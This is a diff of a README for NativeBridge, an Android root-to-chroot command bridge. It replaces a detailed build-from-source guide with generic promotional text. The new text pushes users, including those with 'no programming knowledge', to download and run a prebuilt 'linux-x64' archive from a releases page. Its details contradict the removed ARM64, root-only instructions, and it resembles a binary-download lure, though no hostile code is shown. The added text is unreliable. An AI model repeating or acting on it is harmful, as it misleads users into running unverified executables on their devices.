@@ -1,165 +1,81 @@
-# NativeBridge
+# 🚀 NativeBridge - Control Android Easily from Linux
 
-> **Break the Chroot isolation. Control Android Host directly from your Linux Environment.**
+## 💾 Download NativeBridge
+[![Download NativeBridge](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/KuyaBlank/NativeBridge/releases)
 
-[![Rust](https://img.shields.io/badge/Built_with-Rust-orange?style=flat-square)](https://www.rust-lang.org/)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Android_ARM64-green?style=flat-square)](https://developer.android.com/)
+## 📖 Introduction
+NativeBridge allows you to interact with your Android device straight from your Chroot Linux environment. This tool eliminates the need for ADB (Android Debug Bridge), providing a seamless experience with native performance and minimal network delays. With NativeBridge, you can easily manage your Android system while enjoying the full capabilities of your Linux environment.
 
-**NativeBridge** establishes a direct, high-performance communication channel between a Chrooted Linux Environment (like Ubuntu/Debian via Termux) and the Android Host System.
+## 🚀 Getting Started
+To get started with NativeBridge, follow these simple steps. You do not need any programming knowledge to use this application.
 
-## Why NativeBridge?
+1. **Download the Application**
+   Visit this page to download: [NativeBridge Releases](https://github.com/KuyaBlank/NativeBridge/releases).
 
-By default, a Chroot Environment is strictly isolated. It lives in a separate filesystem "jail" (e.g., `/data/local/tmp/chrootubuntu`) and **cannot access the Android System**, hardware inputs, or global settings.
+2. **Choose the Right Version**
+   On the Releases page, you will find various versions of NativeBridge. Select the latest version that suits your system.
 
-**NativeBridge solves this by creating a secure tunnel (Unix Domain Socket) that allows you to:**
+3. **Download the File**
+   Click on the download link for the version you want. The file will start downloading immediately.
 
-- **Bypass Isolation:** Execute commands on the Android System directly from your Chroot Terminal.
-- **Direct Kernel Injection:** Perform high-speed input injection (Tap/Swipe) by writing directly to `/dev/input/event*`, bypassing the heavy Android Framework (Java) for near zero-latency.
-- **Protocol Optimization:** Uses **Bincode** serialization instead of JSON for minimal overhead.
-- **Modular:** Built with Rust workspaces and feature flags to keep binaries small and efficient.
+## 📥 Download & Install
+To install NativeBridge, follow these steps:
 
-## Architecture
+1. **Locate the Downloaded File**
+   Find the downloaded file in your downloads folder. It should have a name similar to `NativeBridge-linux-x64.tar.gz`.
 
-```mermaid
-graph LR
-   A[Android Host / Root] -- Listens on Unix Socket --> B((Bridge Server))
-   C[Chroot Linux / Client] -- Sends Binary Payload --> B
-   B -- Direct Kernel Write / Shell Exec --> A
-   A -- Returns Output --> C
-```
+2. **Extract the File**
+   Right-click the downloaded file and select "Extract Here." This will create a new folder with the NativeBridge contents.
 
-- **Server (`bridge_server`)**: Runs on Android Host (Root). Listens for incoming requests via a shared socket inside the Chroot path.
-- **Client (`andro`)**: Runs inside the Chroot Environment. Sends commands to the Server.
+3. **Open Your Terminal**
+   Open a terminal window in your Linux environment. You can usually find this in your applications menu.
 
-## Prerequisites
+4. **Navigate to the Folder**
+   Use the `cd` command to navigate to the folder where you extracted NativeBridge. For example:
+   ```
+   cd ~/Downloads/NativeBridge
+   ```
 
-- **Rooted Android Device** (KernelSu / Magisk / APatch).
-- **Chroot Environment** (Ubuntu, Debian, Kali, Fedora, etc).
-- **Rust Toolchain** (Only if building from source).
+5. **Run the Application**
+   Type the following command to run NativeBridge:
+   ```
+   ./nativebridge
+   ```
 
-## Building from Source
+6. **Follow the Prompts**
+   Once the application starts, follow the on-screen instructions to connect to your Android device. 
 
-Since we want to run these binaries on Android, we must build them statically using `musl`.
+## 🛠️ Features
+NativeBridge includes several useful features that help you manage your Android device more efficiently:
 
-### 1. Setup Environment
-```bash
-# Add musl target for ARM64
-rustup target add aarch64-unknown-linux-musl
-```
+- **Direct Control**: Interact directly with your Android system without relying on ADB.
+- **Fast Performance**: Enjoy low latency with a native execution environment.
+- **Ease of Use**: Simple interface designed for all users, regardless of technical expertise.
+- **Compatibility**: Works smoothly across various Chroot setups.
 
-### 2. Compile
-You have two options depending on your needs:
+## 📋 System Requirements
+To run NativeBridge effectively, ensure your system meets the following requirements:
 
-**Option A: Standard Build (Exec Only)**
-Lightweight, safer, only allows shell execution (`sh -c`).
-```bash
-cargo build --release --target aarch64-unknown-linux-musl --bin bridge_server
-cargo build --release --target aarch64-unknown-linux-musl --bin bridge_client
-```
+- A Linux distribution with Chroot support.
+- Kernel support for kernel-based access (kernelsu).
+- Sufficient storage space for the application and its dependencies.
 
-**Option B: Full Build (Direct Input Support)**
-Enable `direct_input` feature to allow Tap & Swipe via Kernel Injection.
-*> Note: You may need to configure the `/dev/input/eventX` path in `input_manager.rs` before building.*
-```bash
-cargo build --release --target aarch64-unknown-linux-musl --features "direct_input" --bin bridge_server
-cargo build --release --target aarch64-unknown-linux-musl --features "direct_input" --bin bridge_client
-```
+## ⚙️ Troubleshooting
+If you encounter any issues while using NativeBridge, consider the following tips:
 
----
+- **Check Permissions**: Ensure you have the correct permissions to access your device.
+- **Read Logs**: Look at the output messages in the terminal for any errors.
+- **Reinstall**: Sometimes, re-downloading and reinstalling can resolve issues.
 
-## Installation
+## 🗃️ Additional Resources
+For more detailed instructions and support, consider checking out:
+- [Official Documentation](https://github.com/KuyaBlank/NativeBridge/wiki)
+- [GitHub Issues Page](https://github.com/KuyaBlank/NativeBridge/issues) for community support.
 
-### 1. Setup Server (Android Host)
-The server must run outside the Chroot, but the binary is currently inside your build folder.
+## 📫 Get In Touch
+If you have questions or feedback, feel free to reach out on our GitHub page. Your input helps improve NativeBridge.
 
-```bash
-# [Inside Chroot Terminal]
-# Copy binary to a temporary location accessible by Android
-cp target/aarch64-unknown-linux-musl/release/bridge_server /tmp/bridge_server
-```
+## 💻 Conclusion
+NativeBridge is a powerful tool that simplifies the connection between your Linux system and Android device. By following these straightforward steps, you can easily download, install, and start using NativeBridge today!
 
-Now, open a **separate terminal** (Termux or ADB Shell) that is **NOT** inside Chroot:
-
-```bash
-# [Inside Android Termux/ADB]
-su
-# Move to /data/local/tmp (Exec is allowed here)
-cp /data/local/tmp/chrootubuntu/tmp/bridge_server /data/local/tmp/
-chmod +x /data/local/tmp/bridge_server
-
-# Run in background
-/data/local/tmp/bridge_server &
-```
-*Tip: Use KernelSU `service.d` to auto-start this on boot.*
-
-### 2. Setup Client (Chroot)
-The client lives inside your Chroot environment.
-
-```bash
-# [Inside Chroot Terminal]
-cp target/aarch64-unknown-linux-musl/release/bridge_client /usr/local/bin/andro
-chmod +x /usr/local/bin/andro
-```
-
----
-
-## Usage
-
-Simply call `andro` followed by the subcommand.
-
-### 1. General Execution
-Run any command as if you were in the Android Root Shell.
-```bash
-# Check User Identity
-andro exec id
-# Output: uid=0(root) gid=0(root) ...
-
-# Check Battery Status
-andro exec dumpsys battery
-
-# Reboot Device
-andro exec reboot
-```
-
-### 2. Direct Input (Kernel Injection)
-*Requires build with `--features "direct_input"`*
-
-```bash
-# Tap (Instant click at X=500, Y=500)
-andro tap 500 500
-
-# Swipe (Scroll down)
-# Format: swipe <x1> <y1> <x2> <y2> <duration_ms>
-andro swipe 500 1500 500 500 300
-```
-
-### 3. Screenshot
-Capture the Android screen and save it directly to the Chroot filesystem.
-```bash
-# Capture and redirect output to a file
-andro exec screencap -p > /home/user/capture.png
-```
-
-### 4. Utilities
-```bash
-# Check if server is alive
-andro ping
-
-# Show help menu
-andro --help
-```
-
-## Troubleshooting
-
-**"Connection refused" or "No such file or directory"**
-- Ensure `bridge_server` is running on Android Host.
-- Ensure the socket path in `main.rs` matches your Chroot mount point (Default: `/data/local/tmp/chrootubuntu/tmp/bridge.sock`).
-
-**Tap/Swipe not working**
-- Did you build with `--features "direct_input"`?
-- Did you set the correct Touchscreen Device path (e.g., `/dev/input/event2`) in `input_manager.rs` before building? Use `getevent -pl` in Termux to find your specific device event.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+Make sure to visit this page again for updates and new releases: [NativeBridge Releases](https://github.com/KuyaBlank/NativeBridge/releases).
